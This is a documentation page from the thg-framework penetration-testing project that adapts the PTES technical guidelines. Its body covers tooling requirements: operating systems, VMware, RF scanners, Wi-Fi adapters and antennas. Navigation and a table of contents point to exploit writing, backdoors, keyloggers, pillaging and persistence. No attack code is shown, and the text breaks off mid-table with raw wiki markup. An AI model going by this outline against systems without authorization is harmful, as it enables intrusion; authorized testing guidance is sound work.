<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <meta name="author" content="darkcode0x00 luizcorrea">
        
        <link rel="shortcut icon" href="../../img/favicon.ico">
        <title>Technical Guidelines - thg-framework</title>
        <link href="../../css/bootstrap-custom.min.css" rel="stylesheet">
        <link href="../../css/font-awesome.min.css" rel="stylesheet">
        <link href="../../css/base.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->

        <script src="../../js/jquery-1.10.2.min.js" defer></script>
        <script src="../../js/bootstrap-3.0.3.min.js" defer></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        <script>hljs.initHighlightingOnLoad();</script> 
    </head>

    <body>

        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
            <div class="container">

                <!-- Collapsed navigation -->
                <div class="navbar-header">
                    <!-- Expander button -->
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a class="navbar-brand" href="../..">thg-framework</a>
                </div>

                <!-- Expanded navigation -->
                <div class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">Overview <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li >
    <a href="../../cli/install/">Installation</a>
</li>
                                    
<li >
    <a href="../..">Introduction</a>
</li>
                                    
<li >
    <a href="../../community/">Community</a>
</li>
                                    
<li >
    <a href="../../conceptual/">Conceptual</a>
</li>
                                    
<li >
    <a href="../../cli/build/">build</a>
</li>
                                    
<li >
    <a href="../../cli/tags/">tags</a>
</li>
                                    
<li >
    <a href="../../LICENSE/">LICENSE</a>
</li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">thg_dev <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#">gettin_started</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../dev/thg_dev/_Sidebar/">thg_Development_Environment</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/Using-thg/">using_thg</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#">git</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../dev/git/Using-Git/">Using-Git</a>
</li>
            
<li >
    <a href="../../dev/git/Git-cheatsheet/">Git_cheatsheet</a>
</li>
            
<li >
    <a href="../../dev/git/Git-Reference-Sites/">Git-Reference-Sites</a>
</li>
    </ul>
  </li>
            
<li >
    <a href="../../dev/thg_dev/Reporting-a-Bug/">reporting_a_bug</a>
</li>
            
<li >
    <a href="../../dev/contributing/Contributing-to-thg/">Get Started</a>
</li>
            
<li >
    <a href="../../cli/templates/">templates</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#">Roadmaps</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#">2019</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../dev/roadmaps/2019/2019-Roadmap/">Roadmap</a>
</li>
            
<li >
    <a href="../../dev/roadmaps/2019/2019-Roadmap-Review/">Roadmap_Review</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#">contributing</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../dev/thg_dev/Contributing-to-thg/">contributing_to_thg</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#">thg_development</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#">thg_how_to</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../dev/thg_dev/How-to-get-started-with-writing-an-exploit/">How to get started with writing an exploit</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-get-started-with-writing-an-auxiliary-module/">How to get started with writing an auxiliary module</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-get-started-with-writing-a-post-module/">How to get started with writing a postmodule</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-get-started-with-writing-a-Meterpreter-script/">How to get started with writing a script</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-check-Microsoft-patch-levels-for-your-exploit/">How to check Microsoft patch levels for your exploit</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-clean-up-files-using-XCybrerFileDropper/">How to clean up files using FileDropper</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-deprecate-a-Metasploit-module/">How to deprecate a Metasploit module</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-do-reporting-or-store-data-in-module-development/">How to do reporting or store data in module development</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-log-in-Metasploit/">How to log in THG</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-obfuscate-JavaScript-in-Metasploit/">How to obfuscate JavaScript in Metasploit</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-parse-an-HTTP-response/">How to parse an HTTP response</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-Send-an-HTTP-Request-Using-HTTPClient/">How to Send an HTTP Request Using HTTPClient</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-send-an-HTTP-request-using-Rex-Proto-Http-Client/">How to send an HTTP request using Rex Proto Http Client</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-command-stagers/">How to use command stagers</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-datastore-options/">How to use datastore options</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-Msf-Auxiliary-AuthBrute-to-write-a-bruteforcer/">How to use Msf Auxiliary AuthBrute to write a bruteforcer</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-PhpEXE-to-exploit-an-arbitrary-file-upload-bug/">How to use PhpEXE to exploit an arbitrary file upload bug</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-Powershell-in-an-exploit/">How to use Powershell in an exploit</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-Railgun-for-Windows-post-exploitation/">How to use Railgun for Windows post exploitation</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit/">How to Use the FILEFORMAT mixin to create a file format exploit</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-the-Msf-Exploit-Remote-Tcp-mixin/">How to use the Msf Exploit Remote Tcp mixin</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-the-Seh-mixin-to-exploit-an-exception-handler/">How to use the Seh mixin to exploit an exception handler</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows/">How to use WbemExec for a write privilege attack on Windows</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-write-a-browser-exploit-using-BrowserExploitServer/">How to write a browser exploit using BrowserExploitServer</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-write-a-browser-exploit-using-HttpServer/">How to write a browser exploit using HttpServer</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-write-a-check()-method/">How to write a check() method</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-write-a-HTTP-LoginScanner-Module/">How to write a HTTP LoginScanner Module</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-write-a-module-using-HttpServer-and-HttpClient/">How to write a module using HttpServer and HttpClient</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-zip-files-with-Rex-Zip-Archive.md">How to zip files with Rex Zip Archive</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-use-Metasploit-Framework-Obfuscation-CRandomizer/">How to use Metasploit Framework Compiler Windows to compile C code</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How to use Metasploit Framework Obfuscation CRandomizer">How to use Metasploit Framework Obfuscation CRandomizer</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-decrypt-RC4-with-Metasploit-Framework-Compiler/">How to decrypt RC4 with Metasploit Framework Compiler</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-decode-Base64-with-thg-Framework-Compiler.md">How to decode Base64 with tgh Framework Compiler</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/How-to-XOR-with-thg-Framework-Compiler.md">How to XOR with thg Framework Compiler</a>
</li>
    </ul>
  </li>
            
<li >
    <a href="../../dev/thg_dev/Style_Tips/">Style_Tips</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/Running-Private-Modules/">Running Private Modules</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/Exploit-Ranking/">Exploit Ranking</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/THG-module-reference-identifiers/">THG module reference identifiers</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/Using-ReflectiveDll-Injection.md">Using ReflectiveDll Injection</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/Oracle-Usage.md">Oracle Usage</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/Rex-Layout.md">Rex Layout</a>
</li>
            
<li >
    <a href="../../dev/thg_dev/">Definition of Module Reliability, Side Effects, and Stability</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown active">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">documentation <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#">capture the flag</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#">basic</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#">analysis</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../capturetheflag/basic/analysis/linux/">linux</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/analysis/windows/">windows</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/analysis/malware/">malware</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">recovery</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../capturetheflag/basic/recover/backuo/">backup</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/recover/patching/">patching</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">tips_end_tricks</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../capturetheflag/basic/tips_end_tricks/tools/">tools</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/tips_end_tricks/decoding/">decoding</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/tips_end_tricks/dos/">dos</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/tips_end_tricks/os_cheats/">os_cheats</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/tips_end_tricks/snort/">snort</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">identify</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../capturetheflag/basic/identify/basic/">basic</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/identify/nmap/">nmap</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/identify/nessus/">nessus</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/identify/openvas/">openvas</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/identify/windows/">windows</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/identify/linux/">linux</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">defend</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../capturetheflag/basic/prootect_defend/windows/">windows</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/prootect_defend/linux/">linux</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">identify</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../capturetheflag/basic/detect/tcpdump/">tcpdump</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/detect/editcap/">edicap</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/detect/mergecap/">mergecap</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/detect/snort/">snort</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/detect/tshark/">tshark</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/detect/analysis/">analysis</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#">os</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../capturetheflag/basic/detect/linux/">linux</a>
</li>
            
<li >
    <a href="../../capturetheflag/basic/detect/windows/">windows</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
            
<li >
    <a href="../../deployment/">Deployment</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">hash_crack</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../capturetheflag/hash_crack/">index</a>
</li>
            
<li >
    <a href="../../capturetheflag/hash_crack/CORE_HASH_CRACKING_KNOWLEDGE/">CORE_HASH_CRACKING_KNOWLEDGE</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#">pentest_standard</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../preengagemente/">Pre engagement Interactions</a>
</li>
            
<li >
    <a href="../ig/">Intelligence Gathering</a>
</li>
            
<li >
    <a href="../threatmodeling/">Threat Modeling</a>
</li>
            
<li >
    <a href="../vulnterability/">Vulnerability Analysis</a>
</li>
            
<li >
    <a href="../exploration/">Exploitation</a>
</li>
            
<li >
    <a href="../postexploration/">Post Exploitation</a>
</li>
            
<li >
    <a href="../report/">Reporting</a>
</li>
            
<li class="active">
    <a href="./">Technical Guidelines</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">CLI <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#">THG-PART-1</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../tutorials/thg/">THG</a>
</li>
            
<li >
    <a href="../../tutorials/server/server/">thg_server</a>
</li>
            
<li >
    <a href="../../tutorials/version/version/">thg_version</a>
</li>
            
<li >
    <a href="../../tutorials/shells/shells/">thg_shells</a>
</li>
            
<li >
    <a href="../../tutorials/thg_docs/thg_docs/">thg_docs</a>
</li>
            
<li >
    <a href="../../tutorials/auxiliares/auxiliares/">thg_auxiliares</a>
</li>
            
<li >
    <a href="../../tutorials/anti_forensic/anti_forensic/">thg_anti_forensic</a>
</li>
            
<li >
    <a href="../../tutorials/crypto/crypto/">thg_crypto</a>
</li>
            
<li >
    <a href="../../tutorials/drone/drone/">thg_drone</a>
</li>
            
<li >
    <a href="../../tutorials/keylogger/keylogger/">thg_keylogger</a>
</li>
            
<li >
    <a href="../../tutorials/recon/recon/">thg_recon</a>
</li>
            
<li >
    <a href="../../tutorials/voip/voip/">thg_voip</a>
</li>
            
<li >
    <a href="../../tutorials/automation/automation/">thg_automation</a>
</li>
            
<li >
    <a href="../../tutorials/cryptography/cryptography/">thg_cryptography</a>
</li>
            
<li >
    <a href="../../tutorials/exploitation/exploitation/">thg_exploitation</a>
</li>
            
<li >
    <a href="../../tutorials/malware/malware/">thg_malware</a>
</li>
            
<li >
    <a href="../../tutorials/reversing/reversing/">thg_reversing</a>
</li>
            
<li >
    <a href="../../tutorials/thg_windows/thg_windows/">thg_windows</a>
</li>
            
<li >
    <a href="../../tutorials/automobile/automobile/">thg_automobile</a>
</li>
            
<li >
    <a href="../../tutorials/database/database/">thg_database</a>
</li>
            
<li >
    <a href="../../tutorials/fingerprint/fingerprint/">thg_fingerprint</a>
</li>
            
<li >
    <a href="../../tutorials/misc/misc/">thg_misc</a>
</li>
            
<li >
    <a href="../../tutorials/sniffer/sniffer/">thg_sniffer</a>
</li>
            
<li >
    <a href="../../tutorials/wireless/wireless/">thg_wireless</a>
</li>
            
<li >
    <a href="../../tutorials/debugger/debugger/">thg_debugger</a>
</li>
            
<li >
    <a href="../../tutorials/firmware/firmware/">thg_firmware</a>
</li>
            
<li >
    <a href="../../tutorials/mobile/mobile/">thg_mobile</a>
</li>
            
<li >
    <a href="../../tutorials/social/social/">thg_social</a>
</li>
            
<li >
    <a href="../../tutorials/backdoor/backdoor/">thg_backdoor</a>
</li>
            
<li >
    <a href="../../tutorials/decompiler/decompiler/">thg_decompiler</a>
</li>
            
<li >
    <a href="../../tutorials/forensic/forensic/">thg_forensic</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#">THG-PART-2</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../tutorials/networking/networking/">thg_networking</a>
</li>
            
<li >
    <a href="../../tutorials/spoff/spoff/">thg_spoff</a>
</li>
            
<li >
    <a href="../../tutorials/binary/binary/">thg_binary</a>
</li>
            
<li >
    <a href="../../tutorials/defensensive/defensensive/">thg_defensensive</a>
</li>
            
<li >
    <a href="../../tutorials/gpu/gpu/">thg_gpu</a>
</li>
            
<li >
    <a href="../../tutorials/os/os/">thg_os</a>
</li>
            
<li >
    <a href="../../tutorials/nfc/nfc/">thg_nfc</a>
</li>
            
<li >
    <a href="../../tutorials/spoof/spoof/">thg_spoof</a>
</li>
            
<li >
    <a href="../../tutorials/version/version/">thg_version</a>
</li>
            
<li >
    <a href="../../tutorials/bluetooth/bluetooth/">thg_bluetooth</a>
</li>
            
<li >
    <a href="../../tutorials/defensive/defensive/">thg_defensive</a>
</li>
            
<li >
    <a href="../../tutorials/hardware/hardware/">thg_hardware</a>
</li>
            
<li >
    <a href="../../tutorials/packer/packer/">thg_packer</a>
</li>
            
<li >
    <a href="../../tutorials/stego/stego/">thg_stego</a>
</li>
            
<li >
    <a href="../../tutorials/code_audit/code_audit/">thg_code_audit</a>
</li>
            
<li >
    <a href="../../tutorials/disassembler/disassembler/">thg_disassembler</a>
</li>
            
<li >
    <a href="../../tutorials/honeypot/honeypot/">thg_honeypot</a>
</li>
            
<li >
    <a href="../../tutorials/proxy/proxy/">thg_proxy</a>
</li>
            
<li >
    <a href="../../tutorials/tunnel/tunnel/">thg_tunnel</a>
</li>
            
<li >
    <a href="../../tutorials/cracker/cracker/">thg_cracker</a>
</li>
            
<li >
    <a href="../../tutorials/dos/dos/">thg_dos</a>
</li>
            
<li >
    <a href="../../tutorials/ids/ids/">thg_ids</a>
</li>
            
<li >
    <a href="../../tutorials/radio/radio/">thg_radio</a>
</li>
            
<li >
    <a href="../../tutorials/unpacker/unpacker/">thg_unpacker</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav navbar-right">
                        <li>
                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                            <li >
                                <a rel="next" href="../report/">
                                    <i class="fa fa-arrow-left"></i> Previous
                                </a>
                            </li>
                            <li >
                                <a rel="prev" href="../../tutorials/thg/">
                                    Next <i class="fa fa-arrow-right"></i>
                                </a>
                            </li>
                            <li>
                                <a href="https://github.com/darkcode357/thg-framework/edit/master/docs/pentest_standard/tecguidelines.md">Edit on darkcode357/thg-framework</a>
                            </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
    <ul class="nav bs-sidenav">
        <li class="main active"><a href="#tools-required">Tools Required</a></li>
            <li><a href="#operating-systems">Operating Systems</a></li>
            <li><a href="#radio-frequency-tools">Radio Frequency Tools</a></li>
            <li><a href="#software">Software</a></li>
        <li class="main "><a href="#intelligence-gathering">Intelligence Gathering</a></li>
            <li><a href="#osint">OSINT</a></li>
            <li><a href="#individuals">Individuals</a></li>
            <li><a href="#internet-footprint">Internet Footprint</a></li>
            <li><a href="#covert-gathering">Covert gathering</a></li>
            <li><a href="#external-footprinting">External Footprinting</a></li>
            <li><a href="#internal-footprinting">Internal Footprinting</a></li>
        <li class="main "><a href="#vulnerability-analysis">Vulnerability Analysis</a></li>
            <li><a href="#vulnerability-testing">Vulnerability Testing</a></li>
            <li><a href="#vulnerability-validation">Vulnerability Validation</a></li>
            <li><a href="#attack-avenues">Attack Avenues</a></li>
        <li class="main "><a href="#exploitation">Exploitation</a></li>
            <li><a href="#precision-strike">Precision strike</a></li>
            <li><a href="#customized-exploitation">Customized Exploitation</a></li>
            <li><a href="#rf-access">RF Access</a></li>
            <li><a href="#attacking-the-user">Attacking the User</a></li>
            <li><a href="#vpn-detection">VPN detection</a></li>
            <li><a href="#route-detection-including-static-routes">Route detection, including static routes</a></li>
            <li><a href="#pillaging">Pillaging</a></li>
        <li class="main "><a href="#platform-details-php-cgi-etc">Platform details (.php, .cgi, etc)</a></li>
        <li class="main "><a href="#files-that-may-contain-configuration-details-that-are-not-rendered">Files that may contain configuration details (that are not rendered)</a></li>
        <li class="main "><a href="#old">.old</a></li>
        <li class="main "><a href="#new">.new</a></li>
        <li class="main "><a href="#bak">.bak</a></li>
        <li class="main "><a href="#targz">.tar.gz</a></li>
        <li class="main "><a href="#txt">.txt</a></li>
        <li class="main "><a href="#database-dumps-sql">Database dumps .sql</a></li>
            <li><a href="#identify-custom-apps">Identify custom apps</a></li>
            <li><a href="#backups">Backups</a></li>
            <li><a href="#business-impact-attacks">Business impact attacks</a></li>
            <li><a href="#further-penetration-into-infrastructure">Further penetration into infrastructure</a></li>
        <li class="main "><a href="#passwd-s-appuser">passwd -S appuser</a></li>
        <li class="main "><a href="#passwd-s-root">passwd -S root</a></li>
        <li class="main "><a href="#passwd-s-bin">passwd -S bin</a></li>
        <li class="main "><a href="#10004-testhost4examplecom-testhost4">10.0.0.4  testhost4.example.com testhost4</a></li>
            <li><a href="#historylogs">History/Logs</a></li>
            <li><a href="#cleanup">Cleanup</a></li>
            <li><a href="#persistence">Persistence</a></li>
            <li><a href="#post-exploitation">Post Exploitation</a></li>
            <li><a href="#reporting">Reporting</a></li>
            <li><a href="#custom-tools-developed">Custom tools developed</a></li>
        <li class="main "><a href="#appendix-a-creating-openvas-only-safe-checks-policy">Appendix A - Creating OpenVAS "Only Safe Checks" Policy</a></li>
            <li><a href="#general">General</a></li>
            <li><a href="#plugins">Plugins</a></li>
            <li><a href="#credentials">Credentials</a></li>
            <li><a href="#target-selection">Target Selection</a></li>
            <li><a href="#access-rules">Access Rules</a></li>
            <li><a href="#preferences">Preferences</a></li>
            <li><a href="#knowledge-base">Knowledge Base</a></li>
        <li class="main "><a href="#appendix-b-creating-the-only-safe-checks-policy">Appendix B - Creating the "Only Safe Checks" Policy</a></li>
            <li><a href="#general_1">General</a></li>
            <li><a href="#credentials_1">Credentials</a></li>
            <li><a href="#plugins_1">Plugins</a></li>
            <li><a href="#preferences_1">Preferences</a></li>
        <li class="main "><a href="#appendix-c-creating-the-only-safe-checks-web-policy">Appendix C - Creating the "Only Safe Checks (Web)" Policy</a></li>
            <li><a href="#general_2">General</a></li>
            <li><a href="#credentials_2">Credentials</a></li>
            <li><a href="#plugins_2">Plugins</a></li>
            <li><a href="#preferences_2">Preferences</a></li>
        <li class="main "><a href="#appendix-d-creating-the-validation-scan-policy">Appendix D - Creating the "Validation Scan" Policy</a></li>
            <li><a href="#general_3">General</a></li>
            <li><a href="#credentials_3">Credentials</a></li>
            <li><a href="#plugins_3">Plugins</a></li>
            <li><a href="#preferences_3">Preferences</a></li>
        <li class="main "><a href="#appendix-e-nexpose-default-templates">Appendix E - NeXpose Default Templates</a></li>
            <li><a href="#denial-of-service">Denial of service</a></li>
            <li><a href="#discovery-scan">Discovery scan</a></li>
            <li><a href="#discovery-scan-aggressive">Discovery scan (aggressive)</a></li>
            <li><a href="#exhaustive">Exhaustive</a></li>
            <li><a href="#full-audit">Full audit</a></li>
            <li><a href="#hipaa-compliance">HIPAA compliance</a></li>
            <li><a href="#internet-dmz-audit">Internet DMZ audit</a></li>
            <li><a href="#linux-rpms">Linux RPMs</a></li>
            <li><a href="#microsoft-hotfix">Microsoft hotfix</a></li>
            <li><a href="#payment-card-industry-pci-audit">Payment Card Industry (PCI) audit</a></li>
            <li><a href="#penetration-test">Penetration test</a></li>
            <li><a href="#penetration-test_1">Penetration test</a></li>
            <li><a href="#safe-network-audit">Safe network audit</a></li>
            <li><a href="#sarbanes-oxley-sox-compliance">Sarbanes-Oxley (SOX) compliance</a></li>
            <li><a href="#scada-audit">SCADA audit</a></li>
            <li><a href="#web-audit">Web audit</a></li>
    </ul>
</div></div>
                <div class="col-md-9" role="main">

<p>This section is designed to be the PTES technical guidelines that help define certain procedures to follow during a penetration test. Something to be aware of is that these are only baseline methods that have been used in the industry. They will need to be continuously updated and changed upon by the community as well as within your own standard. Guidelines are just that, something to drive you in a direction and help during certain scenarios, but not an all encompassing set of instructions on how to perform a penetration test. Think outside of the box.</p>
<p>[[Image:PTES-TG_Logo.png|center|frameless|300px]]</p>
<h2 id="tools-required">Tools Required</h2>
<p>Selecting the tools required during a penetration test depends on several factors such as the type and the depth of the engagement.  In general terms, the following tools are mandatory to complete a penetration test with the expected results.</p>
<h3 id="operating-systems">Operating Systems</h3>
<p>Selecting the operating platforms to use during a penetration test is often critical to the successfully exploitation of a network and associated system.  As such it is a requirement to have the ability to use the three major operating systems at one time.  This is not possible without virtualization.</p>
<h4 id="macos-x">MacOS X</h4>
<p>MacOS X is a BSD-derived operating.  With standard command shells (such as ''sh'', ''csh'', and ''bash'') and native network utilities that can be used during a penetration test (including ''telnet'', ''ftp'', ''rpcinfo'', ''snmpwalk'', ''host'', and ''dig'') it is the system of choice and is the underlying host system for our penetration testing tools.  Since this is a hardware platform as well, this makes the selection of specific hardware extremely simple and ensures that all tools will work as designed.</p>
<h4 id="vmware-workstation">VMware Workstation</h4>
<p>VMware Workstation is an absolute requirement to allow multiple instances of operating systems easily on a workstation. VMware Workstation is a fully supported commercial package, and offers encryption capabilities and snapshot capabilities that are not available in the free versions available from VMware.  Without the ability to encrypt the data collected on a VM confidential information will be at risk, therefore versions that do not support encryption are not to be used.  The operating systems listed below should be run as a guest system within VMware.</p>
<h5 id="linux">Linux</h5>
<p>Linux is the choice of most security consultants.  The Linux platform is versatile, and the system kernel provides low-level support for leading-edge technologies and protocols.  All mainstream IP-based attack and penetration tools can be built and run under Linux with no problems.  For this reason, BackTrack is the platform of choice as it comes with all the tools required to perform a penetration test.</p>
<h5 id="windows-xp7">Windows XP/7</h5>
<p>Windows XP/7 is required for certain tools to be used.  Many commercial tools or Microsoft specific network assessment and penetration tools are available that run cleanly on the platform.</p>
<h3 id="radio-frequency-tools">Radio Frequency Tools</h3>
<h4 id="frequency-counter">Frequency Counter</h4>
<p>A Frequency Counter should cover from 10Hz- 3 GHz.  A good example of a reasonably priced frequency counter is the MFJ-886 Frequency Counter.</p>
<h4 id="frequency-scanner">Frequency Scanner</h4>
<p>A scanner is a radio receiver that can automatically tune, or scan, two or more discrete frequencies, stopping when it finds a signal on one of them and then continuing to scan other frequencies when the initial transmission ceases.  These are not to be used in Florida, Kentucky, or Minnesota unless you are a person who holds a current amateur radio license issued by the Federal Communications Commission.  The required hardware is the Uniden BCD396T Bearcat Handheld Digital Scanner or PSR-800 GRE Digital trunking scanner.</p>
<h4 id="spectrum-analyzer">Spectrum Analyzer</h4>
<p>A spectrum analyzer is a device used to examine the spectral composition of some electrical, acoustic, or optical waveform.  A spectrum analyzer is used to determine whether or not a wireless transmitter is working according to federally defined standards and is used to determine, by direct observation, the bandwidth of a digital or analog signal.  A good example of a reasonably priced spectrum analyzer is the Kaltman Creations HF4060 RF Spectrum Analyzer.</p>
<h4 id="80211-usb-adapter">802.11 USB adapter</h4>
<p>An 802.11 USB adapter allow for the easy connection of a wireless adapter to the penetration testing system.  There are several issues with using something other than the approved USB adapter as not all of them support the required functions.  The required hardware is the Alfa AWUS051NH 500mW High Gain 802.11a/b/g/n high power Wireless USB.</p>
<h4 id="external-antennas">External Antennas</h4>
<p>External antennas come in a variety of shapes, based upon the usage and with a variety of connectors.  All external antennas must have RP-SMA connectors that are compatible with the Alfa.  Since the Alfa comes with an Omni-directional antenna, we need to obtain a directional antenna.  The best choice is a panel antenna as it provides the capabilities required in a package that travels well.  The required hardware is the L-com 2.4 GHz 14 dBi Flat Panel Antenna with RP-SMA connector.  A good magnetic mount Omni-directional antenna such as the L-com 2.4 GHz/900 MHz 3 dBi Omni Magnetic Mount Antenna with RP-SMA Plug Connector is a good choice.</p>
<h4 id="usb-gps">USB GPS</h4>
<p>A GPS is a necessity to properly perform an RF assessment.  Without this it's simply impossible to determine where and how far RF signals are propagating.  There are numerous options are available, therefore you should look to obtain a USB GPS that is supported on operating system that you are using be that Linux, Windows and Mac OS X.</p>
<h3 id="software">Software</h3>
<p>The software requirements are based upon the engagement scope, however we<nowiki>'</nowiki>ve listed some commercial and open source software that could be required to properly conduct a full penetration test.</p>
<p>{|border#"2" cellspacing#"0" cellpadding#"4" width#"100%"
|<u>'''Software'''</u>
|<u>'''URL'''</u>
|<u>'''Description'''</u>
|<u>'''Windows Only'''</u></p>
